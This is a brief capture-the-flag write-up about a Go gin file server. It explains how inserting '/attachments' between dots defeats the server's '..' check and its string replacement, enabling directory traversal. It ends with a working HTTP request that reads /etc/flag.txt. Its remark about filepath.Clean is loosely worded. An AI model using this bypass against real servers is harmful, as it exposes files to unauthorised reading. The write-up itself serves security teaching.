secure email attachments
============

Challengers are provided the following `golang` code.

```go
func main() {
	r := gin.Default()

	r.GET("/*path", func(c *gin.Context) {
		p := c.Param("path")
		if strings.Contains(p, "..") {
			c.AbortWithStatus(400)
			c.String(400, "URL path cannot contain \"..\"")
			return
		}
		// Some people were confused and were putting /attachments in the URLs. This fixes that
		cleanPath := filepath.Join("./attachments", filepath.Clean(strings.ReplaceAll(p, "/attachments", "")))
		http.ServeFile(c.Writer, c.Request, cleanPath)
	})

	r.Run("0.0.0.0:1337")
}
```

The main issue is the use of `filepath.Clean` to *sanitise* the user provided file path. `filepath.Clean` and `path.Clean` have a misleading file name and do not *clean* paths that do not start with `/`. So you can perform a directory traversal attack starting a path with `../../`. This is a common mistake `golang` developers make when handling user controllable path inputs.

However, there is a validation check ensuring that no `..` sequences exist in the provided path. This can be bypassed by abusing the `strings.ReplaceAll(p, "/attachments", "")` by inserting `/attachments` in between `..` characters.

The final payload to read the flag using Burp Suite Repeater.

```go
GET /attachments./attachments./attachments/./attachments./attachments/etc/flag.txt HTTP/1.1
Host: 127.0.0.1:1337

```